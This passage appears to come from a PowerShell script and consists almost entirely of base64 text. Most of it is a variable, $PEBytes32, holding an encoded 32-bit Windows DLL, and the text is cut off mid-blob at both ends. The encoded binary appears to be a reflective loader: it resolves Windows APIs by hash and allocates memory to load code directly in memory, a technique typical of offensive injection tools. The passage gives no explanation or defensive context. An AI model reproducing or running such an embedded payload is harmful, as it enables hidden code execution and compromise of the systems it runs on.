AK0IrQAAAGABAOgAAADQoNig4KDooEipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwBwAQD4AAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3inAIABAJQBAACgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AkAEARAAAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoQAAAgAQAAAAiKmgqaipAAAAMAIAXAAAADCgWKCYoCCiaKKIoqiiyKLoohijMKM4o0CjeKOAo7il0KjgqOio8Kj4qACpCKkQqRipIKkoqTipQKlIqVCpWKlgqWipcKmwqdipAKowqlCqeKoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
    $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAaDk+5Xm8h6l5vIepebyHq6vPQ6lZvIerq89LqLm8h6urz0+pGbyHqMDQi60xvIeowNCTrfW8h6jA0JetObyHqVxey6ldvIepebyDqOm8h6ow0KOtbbyHqjDQh619vIeqMNN7qX28h6ow0I+tfbyHqUmljaF5vIeoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQRQAATAEGAK/C4lcAAAAAAAAAAOAAAiELAQ4AABABAADcAAAAAAAAvyIAAAAQAAAAIAEAAAAAEAAQAAAAAgAABQABAAAAAAAFAAEAAAAAAABAAgAABAAAAAAAAAMAQAEAABAAABAAAAAAEAAAEAAAAAAAABAAAAAgzAEAfQAAAKDMAQBkAAAAABACAOABAAAAAAAAAAAAAAAAAAAAAAAAACACALwQAADwvgEAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACi/AQBAAAAAAAAAAAAAAAAAIAEAUAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAPA4BAAAQAAAAEAEAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAJSzAAAAIAEAALQAAAAUAQAAAAAAAAAAAAAAAABAAABALmRhdGEAAADAEQAAAOABAAAKAAAAyAEAAAAAAAAAAAAAAAAAQAAAwC5nZmlkcwAA6AAAAAAAAgAAAgAAANIBAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAAOABAAAAEAIAAAIAAADUAQAAAAAAAAAAAAAAAABAAABALnJlbG9jAAC8EAAAACACAAASAAAA1gEAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7ItNDFZXi30Ihcl1A41PIItFEIlHMItFFIlHNI1HGFBXaCMRABBR6Cw/AACL8IPEEIX2dA1+Hg+39oHOAAAHgOsTi08ED7cBUFFqAlfoCQAAAIPEEF+Lxl5dw1WL7P91FItFCP91EP91DP9wHP9wGOgjPwAAg8QUhcB+CA+3wA0AAAeAXcNVi+xWi3UI/3Yc/3YY6EM/AACDZhgAg2YcAFlZXl3DVYvsi0UMM9JWviwiARCFwHQQi9CL8I1KAYoCQoTAdfkr0YtNCI1CAYNhBACDYQwAiTGJQQheXcNVi+yLRQxWVzP/vjAiARCL14XAdBaL0IvwjUoCZosCg8ICZjvHdfUr0dH6i00IjQRVAgAAAIl5BIl5DF+JMYlBCF5dw1WL7ItFKIXAdGqLTQyLVRBTi10cV4t9IIPpAHQqg+kBdSiE0nQGD7bKQesFuQABAACJCItNFIlICItNGIlIDIlYEIl4FOsGgyAAi00YVotwMIX2dBz/cDT/dSRXU1H/dRSLzlL/dQz/dQjoERkAAP/WXl9bXcIkAFWL7ItFDAtFEHQti1UIi0oIi0IMI00MI0UQC8h0FotCEItKFCNFDCNNEDtCEHUFO0oUdAQywF3DsAFdw1WL7IPsEKDbwQEQi1UMi8pWi3UIgekowQEQgckAAAALiwKJRfSLQgSJRfiLQgiDwgyJTfCLTRyJRfyLRgRRg2EEAP91GIkBi0YE/3UU/3UQD7cAg2EUAIlBCMdBDAIAAACJURAPtwKJQRiNRfBQx0EcAQAAAP92HP92GOjAPQAAg8QcXovlXcPMaDAeARDozhUAAFnDzMzMzFWL7IPsKKEE4AEQM8WJRfxTVldqCVkzwI192POraJh3ARAy2/8VHCABEIvwhfZ0I2i0dwEQVv8VGCABEIXAdAiNTdhR/9D+w1b/FRQgARCE23UKjUXYUP8VCCABEA+3TdhfXluFyXQWg/kGdA0z0oP5CWoEWA9FwusHagLrAmoIWItN/DPN6FYMAACL5V3DVYvsgeyEAgAAoQTgARAzxYlF/FOLwTPbiYWE/f//V4v6hcB1BzLA6UoBAAA5Hw+EQAEAAFaLNRggARBoyHcBEP83/9aJhYD9//+FwA+EIQEAAGjYdwEQ/zf/1mjsdwEQ/zeL8P8VGCABEImFfP3//4X2D4T7AAAAM//HhYz9//8yAAAAR4XAD4WRAAAAi4WE/f//vgR4ARCLzmaLEGY7EXUeZoXSdBVmi1ACZjtRAnUPg8AEg8EEZoXSdd6Lw+sEG8ALx4XAdVaNhYz9//9QajKNRZhQ/5WA/f//hcAPiJAAAACNRZhmiwhmOw51IWaFyXQVZotIAmY7TgJ1EoPABIPGBGaFyXXeM8mLw0HrBxvAM8lBC8GFwHVZitnrVVeLPQwgARD/14vwiZ2I/f//6D3+//+NhYz9//9QajKNRZhQjYWI/f//UGgEAQAAjYWQ/f//UFNqBlP/tYT9//9T/5V8/f//agGFwA+221hWD0nY/9deisOLTfxfM81b6NAKAACL5V3DVYvsg+T4g+wMoQTgARAzxIlEJAhWagJqAP8VSCEBEINkJAgAjUwkCOjkBwAAhcB4KYt0JAiF9nQhUYvEVokwiwb/UAS6KHgBELnggwEQ6GUGAABZ/xVEIQEQi0wkDF4zzOhmCgAAi+Vdw1WL7ItFDIPoAXQVg+gFdRiLTRCFyXQRoZzxARCJAesIi0UIo5zxARAzwEBdwgwAiwmFyXQGiwFR/1AIw1WL7ItFBF3DVYvsg+wwUzPAVleL+IlF7IlF6Il98IlF5Oja////i9i4TVoAAGY5A3UXi0M8jUjAgfm/AwAAdwmBPBhQRQAAdANL69xkoTAAAACJXeDHRdgDAAAAx0XQAgAAAItADMdF1AEAAACLQBSJRfyFwA+ElQEAAIvYi1MoM8kPt3MkigLByQ08YQ+2wHIDg8HgA8iBxv//AABCZoX2deOB+Vu8SmoPhbcAAACLcxBqA4tGPItEMHgDxolF3It4IItAJAP+A8aJRfSLXfRYiUX4iw8DzjPSigHByg0PvsAD0EGKAYTAdfGB+o5ODux0EIH6qvwNfHQIgfpUyq+RdU2LRdwPtwuLQByNBIiB+o5ODux1CosEMAPGiUXs6yKB+qr8DXx1CosEMAPGiUXo6xCB+lTKr5F1CIsEMAPGiUXwi0X4Bf//AACJRfjrA4tF+GoCWYPHBAPZZoXAD4Vw////636B+V1o+jx1fItTEItCPItEEHgDwolF3Itd3It4IItAJAP6A8KJRfQzwECJRfiLDwPKM/aKAcHODQ++wAPwQYoBhMB18YH+uApMU3Uhi0X0D7cIi0McjQSIiwQQA8KJReSLRfgF//8AAIlF+OsDi0X4agJZAU30g8cEZoXAda+LffCLXfyDfewAdBCDfegAdAqF/3QGg33kAHUNixuJXfyF2w+FcP7//4td4ItzPGpAA/NoADAAAIl19P92UGoA/9eLVlSL+Il98IvLhdJ0Eyv7iX3cigGIBA9Bg+oBdfWLffAPt0YGD7dOFIXAdDmDwSwDzotR+EiLMQPXiUXgA/OLQfyJRdyFwHQQi/iKBogCQkaD7wF19Yt98ItF4IPBKIXAdc+LdfSLnoAAAAAD34ld+ItDDIXAdHkDx1D/VeyLcxCJRdwD94sDA8eJReCDPgB0T4td3IXAdCKLCIXJeRyLQzwPt8mLRBh4K0wYEItEGByNBIiLBBgDw+sMiwaDwAIDx1BT/1XoiQaDxgSLReCFwHQGg8AEiUXggz4AdbeLXfiLQyCDwxSJXfiFwHWKi3X0i8crRjSDvqQAAAAAiUXcD4SqAAAAi56gAAAAA9+JXeCNSwSLAYlN6IXAD4SPAAAAi3XcixODwPgD19HoiUXcjUMIiUXsdGCLfdyL2A+3C09mi8FmwegMZoP4CnQGZjtF2HULgeH/DwAAATQR6ydmO0XUdRGB4f8PAACLxsHoEGYBBBHrEGY7RdB1CoHh/w8AAGYBNBFqAlgD2IX/da6LffCLXeCLTegDGYld4I1LBIsBiU3ohcAPhXf///+LdfSLdihqAGoAav8D9/9V5P91CDPAQFBX/9Zfi8ZeW4vlXcIEAGoEuE0dARDo0vYAAIvZagzoNwYAAIvwWYl18INl/ACF9nQe/3UIi/4zwKurq4NmBADHRggBAAAA6J8TAACJBusCM/aDTfz/iTOF9nUKaA4AB4DoZRMAAIvD6Fr2AADCBABWi/GLDoXJdAjoBQAAAIMmAF7DVovxV41GCFD/FRAgARCL+IX/dS+F9nQrOQZ0Cv82/xU4IQEQIT6DfgQAdA3/dgTo1wUAAINmBABZagxW6IkFAABZWYvHX17DUf8VMCEBEMNVi+yD7BChBOABEDPFiUX8i0UIg2X0AINl8ABTVldoTIQBEP8wi/qL8TLb/xUYIAEQhcB1EGhghAEQ6PgEAABZ6YkAAACNTfRRaNiKARBo9IMBEP/QhcB5DlBowIQBEOjTBAAAWevYi0X0jVXwUmjIigEQVosIUP9RDIXAeQhQaBCFARDr2YtF8I1V+FJQiwj/USiFwHkIUGhwhQEQ68CDffgAdQdo2IUBEOuOi0XwV2i4igEQaBh4ARCLCFD/USSFwHkIUGgwhgEQ65OzAYtN9IXJdAqLAVH/UAiDZfQAi1XwhdJ0BosKUv9RCItN/IrDX14zzVvobgQAAIvlXcNVi+xTaNh3ARD/MjLb/xUYIAEQhcB1DWiYhgEQ6BcEAABZ6y3/dQhouIoBEGgYeAEQaOCGARBoHIQBEP/QhcB5DlBo6IYBEOjsAwAAWevSswGKw1tdw2pAuJ0dARDo7fQAAIvyiU20g2X8AGoM6BcEAACL2FmJXejGRfwBhdt0MIv7M8Crq6uLfbSDYwQAV8dDCAEAAAD/FTwhARCJA4XAdRCF/3QMaA4AB4DoSREAADPbxkX8AIld6IXbdOlqCFjGRfwCVmaJRdj/FTwhARCJReCFwHUEhfZ1zIs1NCEBEI1FuFD/1o1FyFD/1moBagBqDMZF/AX/FSwhARCDZewAi/CNRdiJdbRQjUXsUFb/FSghARCFwHkIUGg4hwEQ6z6LRQiFwHUKaANAAIDpev///4sIjVW4UlaD7BCNdciL/GoApWgYAQAA/zOlUKWl/5HkAAAAhcB5D1BokIcBEOjVAgAAWVnrEv91wOjJAgAAWf91tP8VJCEBEIs1MCEBEI1FyFD/1o1FuFD/1o1F2FD/1ovL6Bn9//+DTfz/i0UIhcB0BosIUP9RCOhc8wAAw2osuOodARDolPMAAIlNyDPbi/OJXdCJXeSJXfyJXdzGRfwBjU3UaOCHARCJXdToW/z//4ld4MZF/AONTdho9IcBEIld2OhE/P//aASEARDGRfwE/xUcIAEQi33YiUXMhcAPhLQBAACNVcy5HIQBEOj19f//jVXMuTSEARCK2Ojm9f//hMB0HI1FzLkchAEQjVXQUITbdQW5NIQBEOix/P//6xCE23QRjUXQUI1VzOie/f//WTPb6wQz24rDhMAPhFcBAACLRdBQiwj/USiL8IX2eRFWaGCIARDoqwEAAFnpQQEAAItF5IXAdAaLCFD/UQiLRdCNVeSJXeRSUIsI/1E0i/CF9nkIVmioiAEQ68qLReSFwHQGiwhQ/1EIi0XQjVXkiV3kUlCLCP9RNIvwhfZ5CFZoIIkBEOufi3XkhfZ1CmgDQACA6P8OAACLRdyFwHQGiwhQ/1EIjU3ciV3ciwZRaKiKARBW/xCL8IX2eQtWaJCJARDpX////41F6Ild7FBqAb4ANAAAahGJdej/FSAhARCL2FP/FRwhARBWaOiKARD/cwzoEPcAAIPEDFP/FRghARCLddyF9nSGi0XghcB0BosIUP9RCINl4ACNTeCLBlFTVv+QtAAAAIvwhfZ5C1Zo8IkBEOnu/v//i0XghcAPhEv///+F/3QEixfrAjPS/3XIiwhSUP9RRIvwhfZ5FlZoSIoBEOm+/v//aBiIARDoZAAAAFmLTdCFyXQKiwFR/1AIg2XQAIX/dAeLz+jA+v//xkX8AotF4IXAdAaLCFD/UQiLTdSFyXQF6KP6///GRfwAi0XchcB0BosIUP9RCINN/P+LReSFwHQGiwhQ/1EIi8bo0/AAAMNVi+xWi3UIagHosjYAAFmNTQxRagBWUOgQAAAA/3AE/zDo30kAAIPEGF5dw7io8QEQwzsNBOABEPJ1AvLD8umoAwAAVYvs/3UI6JgEAABZXcNVi+zrH/91COgySgAAWYXAdRKDfQj/dQfodgUAAOsF6FIFAAD/dQjoqUoAAFmFwHTUXcPpXQQAAFWL7ItFDIPoAHQzg+gBdCCD6AF0EYPoAXQFM8BA6zDoHwYAAOsF6PkFAAAPtsDrH/91EP91COgaAAAAWesQg30QAA+VwA+2wFDoGQEAAFldwgwAzMxqEGgoxgEQ6KcKAABqAOhLBgAAWYTAdQczwOngAAAA6FAFAACIReOzAYhd54Nl/ACDPczrARAAdAdqB+jtCAAAxwXM6wEQAQAAAOhyBQAAhMB0Zej4CQAAaHgqABDo2QcAAOiFCAAAxwQk9SgAEOjIBwAA6JIIAADHBCRwIQEQaGAhARDoJkoAAFlZhcB1KegVBQAAhMB0IGhcIQEQaFQhARDorEkAAFlZxwXM6wEQAgAAADLbiF3nx0X8/v///+hEAAAAhNsPhUz////oVggAAIvwgz4AdB5W6FAGAABZhMB0E/91DGoC/3UIizaLzuiyCQAA/9b/BajoARAzwEDo9QkAAMOKXef/dePoqwYAAFnDagxoSMYBEOiVCQAAoajoARCFwH8EM8DrT0ijqOgBEOg+BAAAiEXkg2X8AIM9zOsBEAJ0B2oH6OAHAADo3AQAAIMlzOsBEADHRfz+////6BsAAABqAP91COhpBgAAWVkzyYTAD5XBi8HoegkAAMPozAQAAP915OguBgAAWcNqDGhoxgEQ6BgJAACDZfwAi30Mg/8BdAqD/wJ0BYtdCOsx/3UQV4tdCFPo2gAAAIvwiXXkhfYPhL4AAAD/dRBXU+jW/f//i/CJdeSF9g+EpwAAAIP/AXUHU+gyGwAAWf91EFdT6Pry//+L8Il15IP/AXUrhfZ1Hv91EFBT6OLy////dRBWU+iR/f///3UQVlPodAAAAIP/AXUEhfZ0BIX/dQtT6IQbAABZhf90BYP/A3VI/3UQV1PoYP3//4vwiXXkhfZ0Nf91EFdT6DoAAACL8Oski03siwFR/zBoqB8AEP91EP91DP91COh+AwAAg8QYw4tl6DP2iXXkx0X8/v///4vG6GIIAADDVYvsVos1kCEBEIX2dQUzwEDrEv91EIvO/3UM/3UI6OsHAAD/1l5dwgwAVYvsg30MAXUF6IAFAAD/dRD/dQz/dQjosf7//4PEDF3CDABVi+xqAP8VRCABEP91CP8VQCABEGgJBADA/xVIIAEQUP8VTCABEF3DVYvsgewkAwAAahfoduwAAIXAdAVqAlnNKaOw6QEQiQ2s6QEQiRWo6QEQiR2k6QEQiTWg6QEQiT2c6QEQZowVyOkBEGaMDbzpARBmjB2Y6QEQZowFlOkBEGaMJZDpARBmjC2M6QEQnI8FwOkBEItFAKO06QEQi0UEo7jpARCNRQijxOkBEIuF3Pz//8cFAOkBEAEAAQChuOkBEKO86AEQxwWw6AEQCQQAwMcFtOgBEAEAAADHBcDoARABAAAAagRYa8AAx4DE6AEQAgAAAGoEWGvAAIsNBOABEIlMBfhqBFjB4ACLDQDgARCJTAX4aJQhARDo4f7//4vlXcPp50YAAFWL7FFW/3UIi/GJdfzoYAAAAMcGwCEBEIvGXovlXcIEAINhBACLwYNhCADHQQTIIQEQxwHAIQEQw1WL7FFW/3UIi/GJdfzoJwAAAMcG3CEBEIvGXovlXcIEAINhBACLwYNhCADHQQTkIQEQxwHcIQEQw1WL7FaL8Y1GBMcGoCEBEIMgAINgBABQi0UIg8AEUOh7GwAAWVmLxl5dwgQAjUEExwGgIQEQUOjGGwAAWcNVi+xWi/GNRgTHBqAhARBQ6K8bAAD2RQgBWXQKagxW6IX6//9ZWYvGXl3CBABVi+yD7AyNTfToN////2iExgEQjUX0UOiaGwAAzFWL7IPsDI1N9OhT////aNjGARCNRfRQ6H0bAADMi0EEhcB1BbioIQEQw1WL7ItFCFaLSDwDyA+3QRSNURgD0A+3QQZr8CgD8jvWdBmLTQw7SgxyCotCCANCDDvIcgyDwig71nXqM8BeXcOLwuv56FkHAACFwHUDMsDDZKEYAAAAVr7Q6wEQi1AE6wQ70HQQM8CLyvAPsQ6FwHXwMsBew7ABXsPoJAcAAIXAdAfoegUAAOsF6FpLAACwAcNqAOjPAAAAhMBZD5XAw+hnGwAAhMB1AzLAw+hJUAAAhMB1B+hdGwAA6+2wAcPoQVAAAOhOGwAAsAHDVYvs6M8GAACFwHUYg30MAXUS/3UQi00UUP91COiKBAAA/1UU/3Uc/3UY6M9EAABZWV3D6J8GAACFwHQMaNTrARDoZE4AAFnD6JNIAACFwA+EZkgAAMNqAOj2TwAAWekXGwAAVYvsg30IAHUHxgXs6wEQAei+BAAA6JUaAACEwHUEMsBdw+iSTwAAhMB1CmoA6MEaAABZ6+mwAV3DVYvsg+wMVot1CIX2dAWD/gF1fOgjBgAAhcB0KoX2dSZo1OsBEOgBTgAAWYXAdAQywOtXaODrARDo7k0AAPfYWRrA/sDrRKEE4AEQjXX0V4PgH7/U6wEQaiBZK8iDyP/TyDMFBOABEIlF9IlF+IlF/KWlpb/g6wEQiUX0iUX4jXX0iUX8sAGlpaVfXovlXcNqBegAAgAAzGoIaBjHARDoeQMAAINl/AC4TVoAAGY5BQAAABB1YKE8AAAQgbgAAAAQUEUAAHVPuQsBAABmOYgYAAAQdUGLRQi5AAAAECvBUFHotP3//1lZhcB0KvdAJAAAAIB1IcdF/P7///+wAesfi0XsiwAzyYE4BQAAwA+UwYvBw4tl6MdF/P7///8ywOg/AwAAw1WL7OgPBQAAhcB0D4B9CAB1CTPAudDrARCHAV3DVYvsgD3s6wEQAHQGgH0MAHUS/3UI6EpOAAD/dQjoVxkAAFlZsAFdw1WL7KEE4AEQi8gzBdTrARCD4R//dQjTyIP4/3UH6G1MAADrC2jU6wEQ6NFMAABZ99hZG8D30CNFCF3DVYvs/3UI6Lr////32FkbwPfYSF3DVYvsg+wUg2X0AINl+AChBOABEFZXv07mQLu+AAD//zvHdA2FxnQJ99CjAOABEOtmjUX0UP8VYCABEItF+DNF9IlF/P8VXCABEDFF/P8VWCABEDFF/I1F7FD/FVQgARCLTfCNRfwzTewzTfwzyDvPdQe5T+ZAu+sQhc51DIvBDRFHAADB4BALyIkNBOABEPfRiQ0A4AEQX16L5V3DaPDrARD/FWQgARDDaPDrARDotxgAAFnDuPjrARDD6D/2//+LSASDCASJSATo5////4tIBIMIAolIBMO4tPEBEMNVi+yB7CQDAABTVmoX6FTmAACFwHQFi00IzSkz9o2F3Pz//2jMAgAAVlCJNQDsARDogRgAAIPEDImFjP3//4mNiP3//4mVhP3//4mdgP3//4m1fP3//4m9eP3//2aMlaT9//9mjI2Y/f//ZoyddP3//2aMhXD9//9mjKVs/f//ZoytaP3//5yPhZz9//+LRQSJhZT9//+NRQSJhaD9///Hhdz8//8BAAEAi0D8alCJhZD9//+NRahWUOj4FwAAi0UEg8QMx0WoFQAAQMdFrAEAAACJRbT/FWggARBWjVj/99uNRaiJRfiNhdz8//8a24lF/P7D/xVEIAEQjUX4UP8VQCABEIXAdQ0PtsP32BvAIQUA7AEQXluL5V3DgyUA7AEQAMNTVr5MxQEQu0zFARA783MYV4s+hf90CYvP6DgAAAD/14PGBDvzcupfXlvDU1a+VMUBELtUxQEQO/NzGFeLPoX/dAmLz+gNAAAA/9eDxgQ783LqX15bw/8lUCEBEMzMzMzMzMxowD4AEGT/NQAAAACLRCQQiWwkEI1sJBAr4FNWV6EE4AEQMUX8M8VQiWXo/3X4i0X8x0X8/v///4lF+I1F8GSjAAAAAPLDi03wZIkNAAAAAFlfX15bi+VdUfLDVYvs9kUIAVaL8ccGACIBEHQKagxW6D30//9ZWYvGXl3CBABVi+yDJQTsARAAg+wsUzPbQwkdEOABEGoK6ETkAACFwA+EdAEAAINl7AAzwIMNEOABEAIzyVZXiR0E7AEQjX3UUw+ii/NbiQeJdwSJTwiJVwyLRdSLTeCJRfSB8WluZUmLRdw1bnRlbAvIi0XYNUdlbnULyPfZagFYGslqAIDBAVlTD6KL81uJB4l3BIlPCIlXDHRDi0XUJfA//w89wAYBAHQjPWAGAgB0HD1wBgIAdBU9UAYDAHQOPWAGAwB0Bz1wBgMAdRGLPQjsARCDzwGJPQjsARDrBos9COwBEIN99AeLReCJReSLRdyJRfiJReh8MmoHWDPJUw+ii/NbjV3UiQOJcwSJSwiJUwyLRdipAAIAAIlF7ItF+HQJg88CiT0I7AEQX16pAAAQAHRtgw0Q4AEQBMcFBOwBEAIAAACpAAAACHRVqQAAABB0TjPJDwHQiUXwiVX0i0Xwi030g+AGM8mD+AZ1M4XJdS+hEOABEIPICMcFBOwBEAMAAAD2RewgoxDgARB0EoPIIMcFBOwBEAUAAACjEOABEDPAW4vlXcMzwDkFsPEBEA+VwMPDzMzMzFWL7GoA/3UI/xUU4AEQXcIEAMzMzMzMzMzMzMzMzMzMVYvsav5oOMcBEGjAPgAQZKEAAAAAUIPsGKEE4AEQMUX4M8WJReRTVldQjUXwZKMAAAAAiWXoi10Ihdt1BzPA6SwBAACLy41RAY2kJAAAAACKAUGEwHX5K8qNQQGJRdg9////f3YKaFcAB4DocP///2oAagBQU2oAagD/FXggARCL+Il93IX/dRj/FXQgARCFwH4ID7fADQAAB4BQ6D/////HRfwAAAAAjQQ/gf8AEAAAfRbo+OEAAIll6Iv0iXXgx0X8/v///+syUOh2PAAAg8QEi/CJdeDHRfz+////6xu4AQAAAMOLZegz9ol14MdF/P7///+LXQiLfdyF9nUKaA4AB4Do1/7//1dW/3XYU2oAagD/FXggARCFwHUpgf8AEAAAfAlW6MY8AACDxAT/FXQgARCFwH4ID7fADQAAB4BQ6Jr+//9W/xU8IQEQi9iB/wAQAAB8CVbolDwAAIPEBIXbdQpoDgAHgOhy/v//i8ONZciLTfBkiQ0AAAAAWV9eW4tN5DPN6Mbw//+L5V3CBADMzMzMzMzMzMzMzMzMzMxVi+yLVQhWi/HHBgQiARCLQgSJRgSLQgiLyIlGCMdGDAAAAACFyXQGiwFR/1AEi8ZeXcIEAMzMzMzMzMzMzMzMVovxi04IxwYEIgEQhcl0BosBUf9QCItGDF6FwHQHUP8VgCABEMPMzMzMzMzMzMzMVYvsVovxi04IxwYEIgEQhcl0BosBUf9QCItGDIXAdAdQ/xWAIAEQ9kUIAXQLahBW6B3w//+DxAiLxl5dwgQAzFWL7IPsEItFCIlF9ItFDIlF+I1F8GhUxwEQUMdF8AQiARDHRfwAAAAA6B4RAADMagho+McBEOgl+///i0UIhcB0e4E4Y3Nt4HVzg3gQA3VtgXgUIAWTGXQSgXgUIQWTGXQJgXgUIgWTGXVSi0gchcl0S4tRBIXSdCeDZfwAUv9wGOiFCAAAx0X8/v///+suM8A4RQwPlcDDi2Xo6G1GAAD2ARB0GItAGIsIhcl0D4sBUYtwCIvO6Jj6////1ujk+v//w1WL7FFW/3UIi/GJdfzoV/T//8cGECIBEIvGXovlXcIEAINhBACLwYNhCADHQQQYIgEQxwEQIgEQw2o4aLDHARDoWPr//4tFGIlF5INlxACLXQyLQ/yJRdSLfQj/dxiNRbhQ6C0VAABZWYlF0OhyHAAAi0AQiUXM6GccAACLQBSJRcjoXBwAAIl4EOhUHAAAi00QiUgUg2X8ADPAQIlFwIlF/P91IP91HP91GP91FFPocxIAAIPEFIlF5INl/ADpkAAAAP917OjfAQAAWcOLZejoDhwAAINgIACLVRSLXQyBegSAAAAAfwYPvkMI6wOLQwiJReCLehAzyYlN2DlKDHY6a9kUiV3cO0Q7BItdDH4ii13cO0Q7CItdDH8Wa8EUi0Q4BECJReCLSgiLBMGJReDrCUGJTdg7SgxyxlBSagBT6DgJAACDxBCDZeQAg2X8AIt9CMdF/P7////HRcAAAAAA6A4AAACLw+h2+f//w4tdDIt9CItF1IlD/P910Og2FAAAWehbGwAAi03MiUgQ6FAbAACLTciJSBSBP2NzbeB1UIN/EAN1SoF/FCAFkxl0EoF/FCEFkxl0CYF/FCIFkxl1L4td5IN9xAB1KYXbdCX/dxjoKRQAAFmFwHQYg33AAA+VwA+2wFBX6H/9//9ZWesDi13kw2oEuA8eARDoWd4AAOjdGgAAg3gcAHUdg2X8AOjmFAAA6MkaAACLTQhqAGoAiUgc6GAOAADoHEQAAMxVi+yDfSAAV4t9DHQS/3Ug/3UcV/91COgpBgAAg8QQg30sAP91CHUDV+sD/3Us6KwSAABWi3Uk/zb/dRj/dRRX6AkIAACLRgRAaAABAAD/dSiJRwiLRRz/cAz/dRj/dRBX/3UI6KH9//+DxCxehcB0B1dQ6DUSAABfXcNVi+yLRQiLAIE4Y3Nt4HU2g3gQA3UwgXgUIAWTGXQSgXgUIQWTGXQJgXgUIgWTGXUVg3gcAHUP6P0ZAAAzyUGJSCCLwV3DM8Bdw1WL7IPsRFOLXQxWV4t9GMZF2ADGRf8AgX8EgAAAAH8GD75DCOsDi0MIiUX4g/j/D4zkAgAAO0cED43bAgAAi3UIgT5jc23gD4WVAgAAg34QAw+FzgAAAIF+FCAFkxl0FoF+FCEFkxl0DYF+FCIFkxkPha8AAACDfhwAD4WlAAAA6GoZAACDeBAAD4SDAgAA6FsZAACLcBDoUxkAAMZF2AGLQBSJRfSF9g+EawIAAIE+Y3Nt4HUrg34QA3UlgX4UIAWTGXQSgX4UIQWTGXQJgX4UIgWTGXUKg34cAA+EOAIAAOgJGQAAg3gcAHRB6P4YAACLQByJReDo8xgAAP914FaDYBwA6HADAABZWYTAdR7/deDo/gMAAFmEwA+E+QEAAOn5AQAAi00QiU306waLTfSLRfiBPmNzbeAPhaYBAACDfhADD4WcAQAAgX4UIAWTGXQWgX4UIQWTGXQNgX4UIgWTGQ+FfQEAAIN/DAAPhgQBAACNTdRRjU3oUVD/dSBX6OwPAACLVeiDxBQ7VdQPg+MAAACNSBCLRfiJTeCNefCJfciLfR